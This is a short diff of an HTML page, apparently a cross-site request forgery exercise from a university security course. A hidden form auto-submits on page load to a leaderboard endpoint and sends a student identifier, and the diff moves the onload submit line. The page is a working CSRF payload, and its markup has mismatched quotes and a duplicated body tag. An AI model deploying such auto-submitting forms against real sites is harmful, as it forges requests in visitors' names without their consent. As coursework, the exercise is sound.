@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html>
 	<body>
-		<body onload="document.forms[0].submit()">
 		<form action="https://message.uqcloud.net/leaderboard.php" method="POST">
 			<input type="hidden" name=“name” value="s4497824” />
 		</form>
+		<body onload="document.forms[0].submit()">
+		
 	</body>
 </html>
